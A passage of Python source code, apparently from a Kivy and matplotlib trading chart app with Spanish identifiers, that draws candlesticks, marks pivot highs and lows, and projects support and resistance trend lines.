                    self.x19l.append(x19)
                    self.y19l.append(y19)
                    self.x112l.append(x112)
                    self.y112l.append(y112)
                    if self.open_prices[i]<self.close_prices[i]:
                        self.color_vela="green"
                    elif self.open_prices[i]>self.close_prices[i]:
                        self.color_vela="red"
                    else:
                        self.color_vela="black"
                    xyR3_1gg = [(x5, y5),(x6, y6),(x13,y13),(x2, y2),(x3, y3),(x16,y16),(x7, y7),(x8, y8),(x19,y19),(x4, y4),(x1, y1),(x112,y112)]
                    rect_R3_1gg = Polygon(xyR3_1gg, closed=True, linewidth=self.grosor_linea3, edgecolor=self.color_vela, facecolor=self.color_vela)
                    self.ax.add_patch(rect_R3_1gg)
                    self.lista_poligonos.append(rect_R3_1gg)                   
                margin = 0.4 * (max(self.high_prices) - min(self.low_prices))
                self.ax.set_ylim(min(self.low_prices) - margin, max(self.high_prices) + margin*self.escly)
                self.ax.set_xlim(0,160) 
                self.apagar_funciones="no apagar funciones"
                self.eficiente_renderizado_lineas=1
                Clock.schedule_once(self.marcar_crestas_y_valle_y_deteccion_soportes_resitencias_profundidad_5)
                #-----------Representar volumen del mercado-------------------------------------
                self.volumen_market.pop()
                #indice_volumen_market = range(len(self.volumen_market))               
                #self.binaria_111.set_data(indice_volumen_market, self.volumen_market)                
                self.promedio_V =float("{0:.8f}".format(sum(self.volumen_market) / len(self.volumen_market)))
                #self.promedio_volumen.set_ydata([self.promedio_V])
                #if self.promedio_V>=0 and self.promedio_V<=1.00025:
                    #haadhadjhg="Bad"                   
                #elif self.promedio_V>1.00025 and self.promedio_V<=1.0005:
                    #haadhadjhg="Fair"              
                #elif self.promedio_V>1.0005 and self.promedio_V<=1.00075:
                    #haadhadjhg="Good"
                #elif self.promedio_V>1.00075:
                    #haadhadjhg="Excellent"                   
                #self.ax26.legend([self.promedio_volumen],[f"Average activity: {self.promedio_V} - Quality of activity: {haadhadjhg}"],edgecolor="k",loc ='upper center', labelcolor="w", ncol=1, fontsize=6,labelspacing=0.1,facecolor="k",bbox_to_anchor=(0.5, self.niv_pos))                
                #margen_de_x=len(self.volumen_market)            
                #self.ax26.set_xlim(0,margen_de_x)            
                #marginxxx = 0.2 * (max(self.volumen_market) - min(self.volumen_market))
                #self.ax26.set_ylim(min(self.volumen_market) - marginxxx, max(self.volumen_market) + marginxxx*self.escly)                
                #-------------------------------------------------------------------------------------------------------------
                self.precio_real(0)                                           
                self.detener_funciones_2 = Clock.schedule_interval(self.precio, 6)
                self.detener_funciones_1 = Clock.schedule_interval(self.detener_funciones_corriendo, 1)
                self.figz.canvas.draw_idle()
                #------------------------------------------------------------------------------------------------------------- 
            else:
                None
        else:
            None           
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def marcar_crestas_y_valle_y_deteccion_soportes_resitencias_profundidad_5(self, dt):        
        self.RRRX1.clear()
        self.RRRY1.clear()                    
        self.RRRX5.clear()
        self.RRRY5.clear()
        self.RRRX6.clear()
        self.RRRY6.clear()                    
        self.RRRX13.clear()
        self.RRRY13.clear()                    
        self.RRRX17.clear()
        self.RRRY17.clear()
        self.RRRX18.clear()
        self.RRRY18.clear()                    
        self.RRRX1S.clear()
        self.RRRY1S.clear()                    
        self.RRRX5S.clear()
        self.RRRY5S.clear()
        self.RRRX6S.clear()
        self.RRRY6S.clear()                    
        self.RRRX13S.clear()
        self.RRRY13S.clear()                    
        self.RRRX17S.clear()
        self.RRRY17S.clear()
        self.RRRX18S.clear()
        self.RRRY18S.clear() 
        self.RRRX1Snn.clear() 
        self.RRRY1Snn.clear() 
        self.RRRX13nn.clear() 
        self.RRRY13nn.clear()
        self.RRRX5S22.clear()
        self.RRRY5S22.clear()
        self.RRRX5xx.clear()
        self.RRRY5xx.clear()
        self.RRRX5ZZ.clear()             
        self.RRRY5ZZ.clear()
        self.RRRX17Szz.clear()                
        self.RRRY17Szz.clear()
        self.RRRX1l.clear()                      
        self.RRRY1l.clear()
        self.RRRX5qq.clear()                    
        self.RRRY5qq.clear()
        self.RRRX5qqm.clear()                         
        self.RRRY5qqm.clear()
        self.RRRX5e.clear()                
        self.RRRY5e.clear()                           
        #-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
        self.resistencia_crestaszz.clear()
        self.interaciones_resistenciazz.clear()
        self.soporte_valleszz.clear()
        self.interaciones_soportezz.clear()
        #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        self.resistencia_crestaszzE.clear()
        self.resistencia_crestaszzE1.clear()
        self.interaciones_resistenciazzE.clear()
        self.interaciones_resistenciazzE1.clear()
        self.soporte_valleszzE.clear()
        self.soporte_valleszzE1.clear()
        self.interaciones_soportezzE.clear()
        self.interaciones_soportezzE1.clear()
        #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        self.registro_de_ultimas_20_velas_japonezas_1M=self.high_prices
        self.registro_de_ultimas_20_velas_japonezas_1MS=self.low_prices       
        interciones5m=3
        try:
            if self.instancias_a_eliminar_contador == 1:
                try:
                    # Borrar todos los textos almacenados
                    for texto in self.instancias_a_eliminar1:
                        texto.remove()
                except:
                    None 
                try:
                    # Borrar todos los textos almacenados
                    for texto in self.instancias_a_eliminar2:
                        texto.remove()
                except:
                    None
                try:
                    # Borrar todos los textos almacenados
                    for texto in self.instancias_a_eliminar3:
                        texto.remove()
                except:
                    None 
                try:
                    # Borrar todos los textos almacenados
                    for texto in self.instancias_a_eliminar4:
                        texto.remove()
                except:
                    None 
                try:
                    # Borrar todos los textos almacenados
                    for texto in self.instancias_a_eliminar5:
                        texto.remove()
                except:
                    None 
                try:
                    # Borrar todos los textos almacenados
                    for texto in self.instancias_a_eliminar6:
                        texto.remove()
                except:
                    None                     
                self.instancias_a_eliminar1.clear()
                self.instancias_a_eliminar2.clear()
                self.instancias_a_eliminar3.clear()
                self.instancias_a_eliminar4.clear()
                self.instancias_a_eliminar5.clear()
                self.instancias_a_eliminar6.clear()                                          
            for i in range(len(self.high_prices)):
                if i>interciones5m:                   
                    #-------------------------------------P3------------------------------------------------------------------------------------------------------------------------------------- 
                    gjdfgjk="right"
                    sd=0.615
                    try:
                        if  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i-1] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M [i-2] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i-3] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i+1] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i+2] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i+3]:
                            self.resistencia_crestaszz.append( self.registro_de_ultimas_20_velas_japonezas_1M[i])
                            self.interaciones_resistenciazz.append(i*2+( self.ancho_cuerpo/2)+self.contadorpoli)
                            text_pivot1 = self.ax.text(i*2+(self.ancho_cuerpo/2)+self.contadorpoli+sd,self.registro_de_ultimas_20_velas_japonezas_1M[i],f"F3: {self.registro_de_ultimas_20_velas_japonezas_1M[i]} ↓",color = 'red',fontsize=self.tamanio_letra,zorder=998,horizontalalignment=gjdfgjk, verticalalignment="bottom", fontname=self.estilo_letra,  bbox=dict(facecolor="k",edgecolor="red", boxstyle='round4'))                         
                            self.instancias_a_eliminar1.append(text_pivot1)
                            if self.instancias_a_eliminar_contador == 0:
                                self.instancias_a_eliminar_contador = 1                                
                        if self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i-1] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i-2] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i-3] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i+1] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i+2] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<self.registro_de_ultimas_20_velas_japonezas_1MS[i+3]:
                            self.soporte_valleszz.append(self.registro_de_ultimas_20_velas_japonezas_1MS[i])
                            self.interaciones_soportezz.append(i*2+(self.ancho_cuerpo/2)+self.contadorpoli)
                            text_pivot2 = self.ax.text(i*2+(self.ancho_cuerpo/2)+self.contadorpoli+sd,self.registro_de_ultimas_20_velas_japonezas_1MS[i],f"F3: {self.registro_de_ultimas_20_velas_japonezas_1MS[i]} ↑",color = 'green',fontsize=self.tamanio_letra,zorder=998,horizontalalignment=gjdfgjk, verticalalignment="top", fontname=self.estilo_letra, bbox=dict(facecolor="k", edgecolor="green", boxstyle='round4'))                                                                                                                                   
                            self.instancias_a_eliminar2.append(text_pivot2)
                            if self.instancias_a_eliminar_contador == 0:
                                self.instancias_a_eliminar_contador = 1 
                    except:
                        None                    
                    #-----------------------------------P2--------------------------------------------------------------------------------------------------------------------------------------- 
                    try:
                        if  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i-1] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M [i-2] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i-3] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i+1] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i+2]:
                            self.resistencia_crestaszzE.append( self.registro_de_ultimas_20_velas_japonezas_1M[i])
                            self.interaciones_resistenciazzE.append(i*2+( self.ancho_cuerpo/2)+self.contadorpoli)                                
                            text_pivot3 = self.ax.text(i*2+(self.ancho_cuerpo/2)+self.contadorpoli+sd,self.registro_de_ultimas_20_velas_japonezas_1M[i],f"F2: {self.registro_de_ultimas_20_velas_japonezas_1M[i]} ↓",color = 'red',fontsize=self.tamanio_letra,zorder=997,horizontalalignment=gjdfgjk, verticalalignment="bottom", fontname=self.estilo_letra,  bbox=dict(facecolor="k",edgecolor="red", boxstyle='round4'))
                            self.instancias_a_eliminar3.append(text_pivot3)
                            if self.instancias_a_eliminar_contador == 0:
                                self.instancias_a_eliminar_contador = 1 
                        if self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i-1] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i-2] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i-3] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i+1] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i+2]:
                            self.soporte_valleszzE.append(self.registro_de_ultimas_20_velas_japonezas_1MS[i])
                            self.interaciones_soportezzE.append(i*2+(self.ancho_cuerpo/2)+self.contadorpoli)
                            text_pivot4 = self.ax.text(i*2+(self.ancho_cuerpo/2)+self.contadorpoli+sd,self.registro_de_ultimas_20_velas_japonezas_1MS[i],f"F2: {self.registro_de_ultimas_20_velas_japonezas_1MS[i]} ↑",color = 'green',fontsize=self.tamanio_letra,zorder=997,horizontalalignment=gjdfgjk, verticalalignment="top", fontname=self.estilo_letra, bbox=dict(facecolor="k", edgecolor="green", boxstyle='round4'))                               
                            self.instancias_a_eliminar4.append(text_pivot4)
                            if self.instancias_a_eliminar_contador == 0:
                                self.instancias_a_eliminar_contador = 1 
                    except:
                        None  
                    #-----------------------------------P1--------------------------------------------------------------------------------------------------------------------------------------- 
                    try:
                        if  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i-1] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M [i-2] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i-3] and  self.registro_de_ultimas_20_velas_japonezas_1M[i]>= self.registro_de_ultimas_20_velas_japonezas_1M[i+1]:
                            self.resistencia_crestaszzE1.append( self.registro_de_ultimas_20_velas_japonezas_1M[i])
                            self.interaciones_resistenciazzE1.append(i*2+( self.ancho_cuerpo/2)+self.contadorpoli)                                
                            text_pivot5 = self.ax.text(i*2+(self.ancho_cuerpo/2)+self.contadorpoli+sd,self.registro_de_ultimas_20_velas_japonezas_1M[i],f"F1: {self.registro_de_ultimas_20_velas_japonezas_1M[i]} ↓",color = 'red',fontsize=self.tamanio_letra,zorder=996,horizontalalignment=gjdfgjk, verticalalignment="bottom", fontname=self.estilo_letra,  bbox=dict(facecolor="k",edgecolor="red", boxstyle='round4'))
                            self.instancias_a_eliminar5.append(text_pivot5)
                            if self.instancias_a_eliminar_contador == 0:
                                self.instancias_a_eliminar_contador = 1 
                        if self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i-1] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i-2] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i-3] and self.registro_de_ultimas_20_velas_japonezas_1MS[i]<=self.registro_de_ultimas_20_velas_japonezas_1MS[i+1]:
                            self.soporte_valleszzE1.append(self.registro_de_ultimas_20_velas_japonezas_1MS[i])
                            self.interaciones_soportezzE1.append(i*2+(self.ancho_cuerpo/2)+self.contadorpoli)
                            text_pivot6 = self.ax.text(i*2+(self.ancho_cuerpo/2)+self.contadorpoli+sd,self.registro_de_ultimas_20_velas_japonezas_1MS[i],f"F1: {self.registro_de_ultimas_20_velas_japonezas_1MS[i]} ↑",color = 'green',fontsize=self.tamanio_letra,zorder=996,horizontalalignment=gjdfgjk, verticalalignment="top", fontname=self.estilo_letra, bbox=dict(facecolor="k", edgecolor="green", boxstyle='round4'))                               
                            self.instancias_a_eliminar6.append(text_pivot6)
                            if self.instancias_a_eliminar_contador == 0:
                                self.instancias_a_eliminar_contador = 1 
                    except:
                        None
                    #-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
                else:                             
                    None           
            try:
                #-----------------P3--------------------------------------------------------------------------------------------------------------------------------------------------------- 
                cantidad_de_indices_lista_resistenciazz=len(self.resistencia_crestaszz)
                obtener_ultimos_2_datos_resistenciazz= self.resistencia_crestaszz[cantidad_de_indices_lista_resistenciazz-2:cantidad_de_indices_lista_resistenciazz:]
                obtener_ultimos_2_datos_interaciones_resistenciazz= self.interaciones_resistenciazz[cantidad_de_indices_lista_resistenciazz-2:cantidad_de_indices_lista_resistenciazz:]
                cantidad_de_indices_lista_soporteszz=len(self.soporte_valleszz)
                obtener_ultimos_2_datos_soporte_valleszz= self.soporte_valleszz[cantidad_de_indices_lista_soporteszz-2:cantidad_de_indices_lista_soporteszz:]
                obtener_ultimos_2_datos_interaciones_soporteszz= self.interaciones_soportezz[cantidad_de_indices_lista_soporteszz-2:cantidad_de_indices_lista_soporteszz:]
            except:
                None
            #---------------------P2----------------------------------------------------------------------------------------------------------------------------------------------------- 
            try:
                cantidad_de_indices_lista_resistenciazz333=len(self.resistencia_crestaszzE)
                obtener_ultimos_2_datos_resistenciazz333= self.resistencia_crestaszzE[cantidad_de_indices_lista_resistenciazz333-2:cantidad_de_indices_lista_resistenciazz333:]
                obtener_ultimos_2_datos_interaciones_resistenciazz333= self.interaciones_resistenciazzE[cantidad_de_indices_lista_resistenciazz333-2:cantidad_de_indices_lista_resistenciazz333:]
                cantidad_de_indices_lista_soporteszz333=len(self.soporte_valleszzE)
                obtener_ultimos_2_datos_soporte_valleszz333= self.soporte_valleszzE[cantidad_de_indices_lista_soporteszz333-2:cantidad_de_indices_lista_soporteszz333:]
                obtener_ultimos_2_datos_interaciones_soporteszz333= self.interaciones_soportezzE[cantidad_de_indices_lista_soporteszz333-2:cantidad_de_indices_lista_soporteszz333:]
            except:
                None
             #---------------------P1----------------------------------------------------------------------------------------------------------------------------------------------------- 
            try:
                cantidad_de_indices_lista_resistenciazz333a=len(self.resistencia_crestaszzE1)
                obtener_ultimos_2_datos_resistenciazz333a= self.resistencia_crestaszzE1[cantidad_de_indices_lista_resistenciazz333a-2:cantidad_de_indices_lista_resistenciazz333a:]
                obtener_ultimos_2_datos_interaciones_resistenciazz333a= self.interaciones_resistenciazzE1[cantidad_de_indices_lista_resistenciazz333a-2:cantidad_de_indices_lista_resistenciazz333a:]
                cantidad_de_indices_lista_soporteszz333a=len(self.soporte_valleszzE1)
                obtener_ultimos_2_datos_soporte_valleszz333a= self.soporte_valleszzE1[cantidad_de_indices_lista_soporteszz333a-2:cantidad_de_indices_lista_soporteszz333a:]
                obtener_ultimos_2_datos_interaciones_soporteszz333a= self.interaciones_soportezzE1[cantidad_de_indices_lista_soporteszz333a-2:cantidad_de_indices_lista_soporteszz333a:]
            except:
                None                  
            #-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
        except:
            None
        try:
            #----------------P3---------------------------------------------------------------------------------------------------------------------------------------------------------- 
            self.R1 =  obtener_ultimos_2_datos_resistenciazz[0]
            self.R2 =  obtener_ultimos_2_datos_resistenciazz[1]
            self.S1 =  obtener_ultimos_2_datos_soporte_valleszz[0]
            self.S2 =  obtener_ultimos_2_datos_soporte_valleszz[1]
            self.XR1=  obtener_ultimos_2_datos_interaciones_resistenciazz[0]
            self.XR2=  obtener_ultimos_2_datos_interaciones_resistenciazz[1]
            self.XS1=  obtener_ultimos_2_datos_interaciones_soporteszz[0]
            self.XS2=  obtener_ultimos_2_datos_interaciones_soporteszz[1]                             
            if self.XR2>self.XS2:
                self.utimopivot=self.R2
            else:
                self.utimopivot=self.S2
        except:
            None
        #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        try:
            #---------------------P2----------------------------------------------------------------------------------------------------------------------------------------------------- 
            self.R1E =  obtener_ultimos_2_datos_resistenciazz333[0]
            self.R2E =  obtener_ultimos_2_datos_resistenciazz333[1]
            self.S1E =  obtener_ultimos_2_datos_soporte_valleszz333[0]
            self.S2E =  obtener_ultimos_2_datos_soporte_valleszz333[1]
            self.XR1E=  obtener_ultimos_2_datos_interaciones_resistenciazz333[0]
            self.XR2E=  obtener_ultimos_2_datos_interaciones_resistenciazz333[1]
            self.XS1E=  obtener_ultimos_2_datos_interaciones_soporteszz333[0]
            self.XS2E=  obtener_ultimos_2_datos_interaciones_soporteszz333[1]                             
            if self.XR2E>self.XS2E:
                self.utimopivot_entrada=self.R2E
                if len(self.pivot_possible_pred_list)<3:
                    self.pivot_possible_pred_list.append(self.utimopivot_entrada)
                    self.pivot_possible_pred_list.append(self.utimopivot_entrada)
                    self.pivot_possible_pred_list.append(self.utimopivot_entrada)
                else:
                    if self.utimopivot_entrada != self.pivot_possible_pred_list[2]:                                           
                        self.pivot_possible_pred_list.pop(0)
                        self.pivot_possible_pred_list.append(self.utimopivot_entrada)
                    else:
                        None                                        
            else:
                self.utimopivot_entrada=self.S2E
                if len(self.pivot_possible_pred_list)<3:
                    self.pivot_possible_pred_list.append(self.utimopivot_entrada)
                    self.pivot_possible_pred_list.append(self.utimopivot_entrada)
                    self.pivot_possible_pred_list.append(self.utimopivot_entrada)
                else:
                    if self.utimopivot_entrada != self.pivot_possible_pred_list[2]:                                                         
                        self.pivot_possible_pred_list.pop(0)
                        self.pivot_possible_pred_list.append(self.utimopivot_entrada)
                    else:
                        None                                        
        except:
            None
        #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        try:
            #---------------------P1----------------------------------------------------------------------------------------------------------------------------------------------------- 
            self.R1E1 =  obtener_ultimos_2_datos_resistenciazz333a[0]
            self.R2E1 =  obtener_ultimos_2_datos_resistenciazz333a[1]
            self.S1E1 =  obtener_ultimos_2_datos_soporte_valleszz333a[0]
            self.S2E1 =  obtener_ultimos_2_datos_soporte_valleszz333a[1]
            self.XR1E1=  obtener_ultimos_2_datos_interaciones_resistenciazz333a[0]
            self.XR2E1=  obtener_ultimos_2_datos_interaciones_resistenciazz333a[1]
            self.XS1E1=  obtener_ultimos_2_datos_interaciones_soporteszz333a[0]
            self.XS2E1=  obtener_ultimos_2_datos_interaciones_soporteszz333a[1]                             
            if self.XR2E1>self.XS2E1:
                self.utimopivotE1=self.R2E1
                if len(self.pivot_possible_pred_list1)<2:
                    self.pivot_possible_pred_list1.append(self.utimopivotE1)
                    self.pivot_possible_pred_list1.append(self.utimopivotE1)                   
                else:
                    if self.utimopivotE1 != self.pivot_possible_pred_list1[1]:                                           
                        self.pivot_possible_pred_list1.pop(0)
                        self.pivot_possible_pred_list1.append(self.utimopivotE1)
                    else:
                        None                                        
            else:
                self.utimopivotE1=self.S2E1                
                if len(self.pivot_possible_pred_list1)<2:
                    self.pivot_possible_pred_list1.append(self.utimopivotE1)
                    self.pivot_possible_pred_list1.append(self.utimopivotE1)                   
                else:
                    if self.utimopivotE1 != self.pivot_possible_pred_list1[1]:                                                         
                        self.pivot_possible_pred_list1.pop(0)
                        self.pivot_possible_pred_list1.append(self.utimopivotE1)
                    else:
                        None              
        except:
            None                      
        try:
            # Datos de Linea de RESISTENCIA base extendida 4 veces--------------------------------
            XP1=self.XR1
            XP2=self.XR2                        
            YP1=self.R1                        
            YP2=self.R2
            m1 = (YP2 - YP1) / (XP2 - XP1)                      
            b1 = YP1 - m1 * XP1
            multialarg1=(XP2-XP1+XP2)*2
            inicioalarge1=XP1
            x_red1 = [inicioalarge1, multialarg1]  
            y_red1 = [m1 * i + b1 for i in x_red1]                       
            self.RRRX1.append(x_red1[0])
            self.RRRX1.append(x_red1[1])
            self.RRRY1.append(y_red1[0])
            self.RRRY1.append(y_red1[1])
            self.linea_1ax.set_data(x_red1, y_red1)
            dist = ((y_red1[1] - y_red1[0])**2 + (x_red1[1] - x_red1[0])**2)**0.5
            # Datos de Linea de SOPORTE base extendida 4 veces-----------------------------------           
            R1MARCARX=self.XS2
            XP2EXX = R1MARCARX + dist * ((XP2 - XP1) / dist)
            R2MARCARY=self.S2
            YP2EXX = R2MARCARY + dist * ((YP2 - YP1) / dist)
            m2 = (YP2EXX - R2MARCARY) / (XP2EXX - R1MARCARX)                      
            b2 = R2MARCARY - m2 * R1MARCARX
            multialarg2=(XP2EXX-R1MARCARX+XP2EXX)*2
            inicioalarge2=R1MARCARX
            x_verde1 = [inicioalarge2, multialarg2]  
            y_verde1 = [m2 * i + b2 for i in x_verde1]   
            self.RRRX1S.append(x_verde1[0])
            self.RRRX1S.append(x_verde1[1])                       
            self.RRRY1S.append(y_verde1[0])                       
            self.RRRY1S.append(y_verde1[1])                       
            self.linea_4ax.set_data(x_verde1, y_verde1)                        
            # Calcular separacion entre la linea de soporte y resistencia
            # Pendiente de la línea base
            pendiente123 = (y_red1[1] - y_red1[0]) / (x_red1[1] - x_red1[0])
            # Calcular el punto de intersección de la línea base y la línea paralela
            b_A1= y_red1[0]-pendiente123*x_red1[0]
            b_B1= y_verde1[0]-pendiente123*x_verde1[0]
            # Calcular la distancia vertical de separación de estas dos líneas paralelas con igual pendiente
            distancia_vertical = abs(b_B1-b_A1)
            # Calcular y trazar resistencia arriba---------------------
            XP1ESB=self.XR1
            XP2Ett = XP1ESB + dist * ((XP2 - XP1) / dist)
            YP1ESB=self.R1+distancia_vertical
            YP2Ett = YP1ESB + dist * ((YP2 - YP1) / dist)
            m3 = (YP2Ett - YP1ESB) / (XP2Ett - XP1ESB)                      
            b3 = YP1ESB - m3 * XP1ESB
            multialarg3=(XP2Ett-XP1ESB+XP2Ett)*2
            inicioalarge3=XP1ESB
            x_red3 = [inicioalarge3, multialarg3]  
            y_red3 = [m3 * i + b3 for i in x_red3]                      
            self.RRRX5.append(x_red3[0])
            self.RRRX5.append(x_red3[1])
            self.RRRY5.append(y_red3[0])
            self.RRRY5.append(y_red3[1])                        
            self.linea_7ax.set_data(x_red3, y_red3)
            # Linea mas arriba de la  resistencia arriba---------------------
            XP1ESB1=self.XR1
            XP2Ett1 = XP1ESB1 + dist * ((XP2 - XP1) / dist)                        
            YP1ESB1=self.R1+distancia_vertical*2
            YP2Ett1 = YP1ESB1 + dist * ((YP2 - YP1) / dist)
            m4 = (YP2Ett1 - YP1ESB1) / (XP2Ett1 - XP1ESB1)                      
            b4 = YP1ESB1 - m4 * XP1ESB1
            multialarg4=(XP2Ett1-XP1ESB1+XP2Ett1)*2
            inicioalarge4=XP1ESB1
            x_red4 = [inicioalarge4, multialarg4]  
            y_red4 = [m4 * i + b4 for i in x_red4]
            self.RRRX6.append(x_red4[0])
            self.RRRX6.append(x_red4[1])
            self.RRRY6.append(y_red4[0]) 
            self.RRRY6.append(y_red4[1])
            self.linea_7ax1.set_data(x_red4, y_red4)
            # Calcular y trazar soporte abajo
            XP1ESBR7=R1MARCARX
            XP2EttR7 = XP1ESBR7 + dist * ((XP2 - XP1) / dist)
            YP1ESBR7=R2MARCARY-distancia_vertical
            YP2EttR7 = YP1ESBR7 + dist * ((YP2 - YP1) / dist)
            m5 = (YP2EttR7 - YP1ESBR7) / (XP2EttR7- XP1ESBR7)                      
            b5 = YP1ESBR7 - m5 * XP1ESBR7
            multialarg5=(XP2EttR7-XP1ESBR7+XP2EttR7)*2
            inicioalarge5=XP1ESBR7
            x_verde5 = [inicioalarge5, multialarg5]  
            y_verde5 = [m5 * i + b5 for i in x_verde5]
            self.RRRX5S.append(x_verde5[0])
            self.RRRX5S.append(x_verde5[1])
            self.RRRY5S.append(y_verde5[0])
            self.RRRY5S.append(y_verde5[1])
            self.linea_10ax.set_data(x_verde5, y_verde5)
            # Calcular y trazar soporte mas abajo 
            XP1ESBR7=R1MARCARX
            XP2EttR7 = XP1ESBR7 + dist * ((XP2 - XP1) / dist)
            YP1ESBR7=R2MARCARY-distancia_vertical*2
            YP2EttR7 = YP1ESBR7 + dist * ((YP2 - YP1) / dist)
            m6 = (YP2EttR7 - YP1ESBR7) / (XP2EttR7- XP1ESBR7)                      
            b6 = YP1ESBR7 - m6 * XP1ESBR7
            multialarg6=(XP2EttR7-XP1ESBR7+XP2EttR7)*2
            inicioalarge6=XP1ESBR7
            x_verde6 = [inicioalarge6, multialarg6]  
            y_verde6 = [m6 * i + b6 for i in x_verde6]
            self.RRRX6S.append(x_verde6[0])
            self.RRRX6S.append(x_verde6[1])
            self.RRRY6S.append(y_verde6[0])
            self.RRRY6S.append(y_verde6[1])
            self.linea_10ax1.set_data(x_verde6, y_verde6)
            xyR3_1 = [ (XP1, YP1),(XP1ESB1, YP1ESB1),(x_red4[1], y_red4[1]),(x_red1[1], y_red1[1])]
            self.rect_R3_1.set_xy(xyR3_1)                        
            xyS3_1 = [(R1MARCARX, R2MARCARY),(XP1ESBR7 , YP1ESBR7),( x_verde6[1], y_verde6[1]),(x_verde1[1], y_verde1[1])]
            self.rect_S3_1.set_xy(xyS3_1)                                             
            # SOPORTE ----------SOPORTE -----------------SOPORTE --------------SOPORTE -------------SOPORTE ----------------SOPORTE ------------------SOPORTE ------------------------   
            # Trazar linea soporte---------------------------
            XP1=self.XS1
            XP2=self.XS2
            YP1=self.S1
            YP2=self.S2
            m7 = (YP2 - YP1) / (XP2- XP1)
            b7 = YP1 - m7 * XP1
            multialarg7=(XP2-XP1+XP2)*2
            inicioalarge7=XP1
            x_verde7 = [inicioalarge7, multialarg7]  
            y_verde7 = [m7 * i + b7 for i in x_verde7]
            self.RRRX13S.append(x_verde7[0])
            self.RRRX13S.append(x_verde7[1])
            self.RRRY13S.append(y_verde7[0])
            self.RRRY13S.append(y_verde7[1])
            self.linea_13ax.set_data(x_verde7, y_verde7)
            dist2 = ((y_verde7[1] - y_verde7[0])**2 + (x_verde7[1] - x_verde7[0])**2)**0.5
            #trazar proyeccion en resistencia basado en el soporte-------------------
            R1MARCARX=self.XR2
            XP2EXX = R1MARCARX + dist2 * ((XP2 - XP1) / dist2)
            R2MARCARY=self.R2
            YP2EXX = R2MARCARY + dist2 * ((YP2 - YP1) / dist2)
            m8 = (YP2EXX - R2MARCARY) / (XP2EXX- R1MARCARX)
            b8 = R2MARCARY - m8 * R1MARCARX
            multialarg8=(XP2EXX-R1MARCARX+XP2EXX)*2
            inicioalarge8=R1MARCARX
            x_red8 = [inicioalarge8, multialarg8]  
            y_red8 = [m8 * i + b8 for i in x_red8] 
            self.RRRX13.append(x_red8[0])
            self.RRRX13.append(x_red8[1])
            self.RRRY13.append(y_red8[0])
            self.RRRY13.append(y_red8[1])                        
            self.linea_16ax.set_data(x_red8, y_red8)
            # Trazar linea de prediccion abajo y arriba---
            # Calcular separacion entre la linea de soporte y resistencia
            # Pendiente de la línea base
            pendiente1 = (y_verde7[1] - y_verde7[0]) / (x_verde7[1] - x_verde7[0])
            # Calcular el punto de intersección de la línea base y la línea paralela
            b_A1x= y_verde7[0]-pendiente1*x_verde7[0]
            b_B1x= y_red8[0]-pendiente1*x_red8[0]
            # Calcular la distancia vertical de separación de estas dos líneas paralelas con igual pendiente
            distancia_verticalxs = abs(b_B1x-b_A1x)
            # Calcular y trazar soporte bajo-------------------                        
            XP1ESB=self.XS1
            XP2Ett = XP1ESB + dist2 * ((XP2 - XP1) / dist2)
            YP1ESB=self.S1-distancia_verticalxs
            YP2Ett = YP1ESB + dist2 * ((YP2 - YP1) / dist2)
